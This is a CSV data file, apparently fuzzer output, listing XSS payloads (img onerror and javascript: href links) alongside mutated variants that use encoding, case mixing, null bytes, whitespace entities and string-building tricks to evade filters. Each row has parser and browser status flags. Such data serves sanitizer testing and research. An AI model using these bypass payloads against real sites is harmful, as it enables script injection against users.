action,seed,mutated,changed,parser_alive,browser_alive
A24,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1) <!--x-->>,True,True,True
A25,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)>,False,True,True
A26,<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)%00>,True,True,True
A27,<img src=x onerror=alert(1)>,<img src=x onerror=top[/al/.source+/ert/.source](1)>,True,True,True
A0,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A1,"<a href=""javascript:alert(1)"">x</a>","<a href=""&#14javascript:alert(1)"">x</a>",True,True,True
A2,"<a href=""javascript:alert(1)"">x</a>","<a HReF=""javascript:alert(1)"">x</a>",True,True,True
A3,"<a href=""javascript:alert(1)"">x</a>","<a%0Ahref=""javascript:alert(1)"">x</a>",True,True,True
A4,"<a href=""javascript:alert(1)"">x</a>","<A HrEF=""JAVAscRipT:aLerT(1)"">x</A>",True,True,True
A5,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A6,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&NewLine;cript:alert(1)"">x</a>",True,True,False
A7,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&#x09;cript:alert(1)"">x</a>",True,True,False
A8,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"">x</a>",True,True,True
A9,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)""><a href=""javascript:alert(1)"">x</a>",True,True,True
A10,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A11,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:&#97;&#108;&#101;&#114;&#116;(1)"">x</a>",True,True,True
A12,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&colon;cript:alert(1)"">x</a>",True,True,False
A13,"<a href=""javascript:alert(1)"">x</a>","<a href=""javas&Tab;cript:alert(1)"">x</a>",True,True,False
A14,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A15,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert`1`"">x</a>",True,True,True
A16,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A17,"<a href=""javascript:alert(1)"">x</a>",<a href=javascript:alert(1)>x</a>,True,True,True
A18,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:\u0061\u006c\u0065\u0072\u0074(1)"">x</a>",True,True,True
A19,"<a href=""javascript:alert(1)"">x</a>","<a href=""&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"">x</a>",True,True,True
A20,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"">x</a>",False,True,True
A21,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top['al'+'ert'](1)"">x</a>",True,True,True
A22,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top[8680439..toString(30)](1)"">x</a>",True,True,True
A23,"<a href=""javascript:alert(1)"">x</a>","search?q=ok <a href=""javascript:alert(1)"">x</a>",True,True,True
A24,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:alert(1)"" <!--x-->>x</a>",True,True,True
A25,"<a href=""javascript:alert(1)"">x</a>","<a href=""vbscript:alert(1)"">x</a>",True,True,False
A26,"<a href=""javascript:alert(1)"">x</a>","<a%00 href=""javascript:alert(1)"">x</a>",True,True,True
A27,"<a href=""javascript:alert(1)"">x</a>","<a href=""javascript:top[/al/.source+/ert/.source](1)"">x</a>",True,True,True
